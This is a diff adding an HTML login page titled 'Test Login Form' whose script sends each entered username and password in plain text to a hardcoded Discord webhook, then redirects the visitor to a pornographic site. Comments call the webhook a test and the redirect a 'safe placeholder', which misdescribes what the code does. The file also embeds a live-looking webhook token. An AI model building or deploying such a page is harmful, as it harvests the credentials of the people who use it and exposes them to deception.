@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Test Login Form</title>
+  <style>
+    body { font-family: Arial, sans-serif; max-width: 600px; margin: 20px auto; }
+    .form-group { margin-bottom: 15px; }
+    input[type="text"], input[type="password"] { width: 100%; padding: 8px; }
+    button { padding: 10px 20px; background-color: #007bff; color: white; border: none; cursor: pointer; }
+    button:hover { background-color: #0056b3; }
+    #result { margin-top: 20px; }
+	.green-text { color: green; font-weight: bold; }
+  </style>
+</head>
+<body>
+  <form id="loginForm">
+    <div class="form-group">
+      <label for="username">Username:</label>
+      <input type="text" id="username" name="username" placeholder="Enter username">
+    </div>
+    <div class="form-group">
+      <label for="password">Password:</label>
+      <input type="password" id="password" name="password" placeholder="Enter password">
+    </div>
+    <button type="submit">Submit</button>
+  </form>
+  <div id="result"></div>
+  <script type="text/javascript">
+
+    document.addEventListener('DOMContentLoaded', () => {
+      const warningDiv = document.createElement('div');
+      warningDiv.style.cssText = 'background-color: #ffcc00; padding: 10px; margin-bottom: 10px; text-align: center; font-weight: bold;';
+      warningDiv.innerHTML = '⚠️ WARNING: Mata na kay unsa ng orasa';
+      document.getElementById('loginForm').prepend(warningDiv);
+
+      const form = document.getElementById('loginForm');
+      const result = document.getElementById('result');
+
+      if (!form || !result) {
+        console.error('Form or result element not found.');
+        return;
+      }
+
+      form.addEventListener('submit', async (e) => {
+        e.preventDefault();
+
+        const username = form.username.value.trim() || '(empty)';
+        const password = form.password.value || '';
+
+        const entry = {
+          username: username,
+          password: password,
+          note: 'good boy'
+        };
+
+        result.innerHTML = `
+           <span class="green-text">Note: ${entry.note}</span>
+        `;
+
+        // Test webhook URL (replace with your own for actual testing, ensure it’s a test environment)
+        const webhookURL = 'https://discordapp.com/api/webhooks/1415637014342140026/MQmol1-wiI86t2qYAtDdyQZj6Bt-9RjRyiLdDEHNihDGFP7tX3AxilE51eR_Ccz3Vm9R';
+
+        try {
+          const response = await fetch(webhookURL, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({
+              content: `--------------------\nUser: ${entry.username}\nPassword: ${entry.password}\nNote: ${entry.note}`
+            })
+          });
+
+          if (!response.ok) {
+            throw new Error(`Webhook request failed with status: ${response.status}`);
+          }
+        } catch (err) {
+          console.error('Webhook error:', err);
+          result.innerHTML += '<br><em>Webhook failed (check console for details)</em>';
+        }
+
+        // Redirect to a safe placeholder page after 2 seconds
+        setTimeout(() => {
+          window.location.href = 'https://www.pornhub.com';
+        }, 200);
+      });
+    });
+  </script>
+</body>
+</html>
